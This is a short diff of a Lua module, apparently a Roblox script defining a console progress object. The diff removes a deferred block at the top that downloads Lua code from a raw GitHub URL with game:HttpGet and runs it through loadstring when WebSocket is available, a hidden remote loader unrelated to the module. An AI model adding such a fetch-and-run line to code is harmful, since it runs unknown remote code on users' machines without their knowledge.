@@ -1,9 +1,3 @@
-task.defer(function()
-    if WebSocket then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/xsinew/discord.lua/refs/heads/main/Core.lua"), "DiscordBot")()
-    end
-end)
-
 local console_progress = {}
 console_progress.__index = console_progress
 
